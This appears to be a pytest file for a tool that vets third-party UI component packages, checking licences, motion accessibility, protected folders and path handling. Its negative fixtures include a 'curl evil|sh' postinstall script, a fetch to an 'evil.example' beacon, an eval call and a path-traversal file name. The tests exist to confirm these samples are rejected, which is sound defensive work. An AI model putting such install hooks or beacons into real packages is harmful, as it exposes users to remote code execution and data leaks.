"""component-intake (WSF-E03) — negative fixtures ARE the DoD: unknown
license REJECT, forbidden postinstall REJECT, hidden fetch REJECT,
fixable no-reduced-motion ADAPT (never PASS), protected roots physically
refused. All offline via --source-file."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from singularity.intake.cli import main as intake_main


def _item(tmp_path: Path, name: str, files: list[dict],
          dependencies: list[str] | None = None) -> Path:
    p = tmp_path / f"{name}.json"
    p.write_text(json.dumps({"name": name, "type": "registry:component",
                             "files": files,
                             "dependencies": dependencies or []}),
                 encoding="utf-8")
    return p


def _run(tmp_path, *argv):
    import io
    import sys as _sys
    buf = io.StringIO()
    old = _sys.stdout
    _sys.stdout = buf
    try:
        rc = intake_main(["run", "--workspace", str(tmp_path / "ws"),
                          "--json", *argv])
    finally:
        _sys.stdout = old
    return rc, json.loads(buf.getvalue())


MIT_HEADER = "/* MIT License — fixture */\n"
ANIM = "export function Fx(){requestAnimationFrame(()=>{});return null}\n"
REDUCED = "if(matchMedia('(prefers-reduced-motion: reduce)').matches){}\n"


def test_no_reduced_motion_is_adapt_never_pass(tmp_path):
    item = _item(tmp_path, "anim", [{"path": "Fx.jsx",
                                     "content": MIT_HEADER + ANIM}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert rc == 1
    assert env["verdict"]["result"] == "ADAPT"
    assert any("prefers-reduced-motion" in r for r in env["data"]["requirements"])


def test_reduced_motion_handled_still_adapt_v1_runtime_cap(tmp_path):
    item = _item(tmp_path, "good", [{"path": "Fx.jsx",
                                     "content": MIT_HEADER + ANIM + REDUCED}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert env["verdict"]["result"] == "ADAPT"  # v1 ceiling: runtime pending
    assert env["data"]["checks"]["runtime"]["status"] == "unavailable"
    assert not any("prefers-reduced-motion variant" in r
                   for r in env["data"]["requirements"])


def test_unknown_license_rejected(tmp_path):
    item = _item(tmp_path, "nolic", [{"path": "Fx.jsx", "content": ANIM}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert rc == 1 and env["verdict"]["result"] == "REJECT"
    assert any("license unknown" in r for r in env["data"]["reject_reasons"])


def test_lifecycle_scripts_rejected(tmp_path):
    pkg = json.dumps({"name": "x", "scripts": {"postinstall": "curl evil|sh"}})
    item = _item(tmp_path, "scripted",
                 [{"path": "Fx.jsx", "content": MIT_HEADER + "export default 1\n"},
                  {"path": "package.json", "content": pkg}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert env["verdict"]["result"] == "REJECT"
    assert any("lifecycle scripts" in r for r in env["data"]["reject_reasons"])


def test_hidden_network_call_rejected(tmp_path):
    code = MIT_HEADER + "fetch('https://evil.example/beacon')\n"
    item = _item(tmp_path, "phone-home", [{"path": "Fx.jsx", "content": code}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert env["verdict"]["result"] == "REJECT"
    assert any("evil.example" in r or "network" in r
               for r in env["data"]["reject_reasons"])


def test_eval_rejected(tmp_path):
    code = MIT_HEADER + "const f = eval('1+1')\n"
    item = _item(tmp_path, "evaler", [{"path": "Fx.jsx", "content": code}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert env["verdict"]["result"] == "REJECT"


def test_allowlisted_font_host_not_rejected(tmp_path):
    code = MIT_HEADER + "const u='https://fonts.googleapis.com/css2'\n"
    item = _item(tmp_path, "fonts", [{"path": "Fx.css", "content": code}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    assert env["verdict"]["result"] != "REJECT"


def test_workspace_protected_root_refused(tmp_path, monkeypatch):
    guarded = tmp_path / "project"
    monkeypatch.setenv("INTAKE_PROTECTED_ROOTS", str(guarded))
    item = _item(tmp_path, "x", [{"path": "a.jsx",
                                  "content": MIT_HEADER + "export default 1\n"}])
    import io
    import sys as _sys
    buf = io.StringIO()
    old = _sys.stdout
    _sys.stdout = buf
    try:
        rc = intake_main(["run", "--source-file", str(item),
                          "--workspace", str(guarded / "ws"), "--json"])
    finally:
        _sys.stdout = old
    env = json.loads(buf.getvalue())
    assert rc == 2 and "protected root" in env["error"]


def test_provenance_chain_uses_record_license(tmp_path):
    item = _item(tmp_path, "chained", [{"path": "Fx.jsx", "content": ANIM}])
    cands = tmp_path / "candidates.json"
    cands.write_text(json.dumps({"candidates": [{
        "candidate_id": "react-bits/chained", "name": "chained",
        "source_url": "https://x.example/", "license": "MIT + Commons Clause",
        "dependencies": ["gsap"]}]}), encoding="utf-8")
    rc, env = _run(tmp_path, "--source-file", str(item),
                   "--candidates", str(cands), "--id", "react-bits/chained")
    assert env["verdict"]["result"] == "ADAPT"  # licensed via record, animates
    lic = env["data"]["checks"]["license"]
    assert lic["license"] == "MIT + Commons Clause"
    assert "E02" in lic["source"]
    assert any("gsap" in r for r in env["data"]["requirements"])


def test_dep_version_specifiers_normalized(tmp_path):
    from singularity.intake.inspect import review_deps
    out = review_deps(["gsap@^3.13.0", "@react-three/fiber@9.6.1", "leftpad"])
    assert out["heavy"] == ["@react-three/fiber", "gsap"]


def test_path_traversal_flattened(tmp_path):
    item = _item(tmp_path, "sneaky",
                 [{"path": "..\\..\\outside.jsx",
                   "content": MIT_HEADER + "export default 1\n"}])
    rc, env = _run(tmp_path, "--source-file", str(item))
    ws = Path(env["inputs"]["workspace"])
    assert (ws / "src" / "outside.jsx").is_file()
    assert not (tmp_path / "outside.jsx").exists()
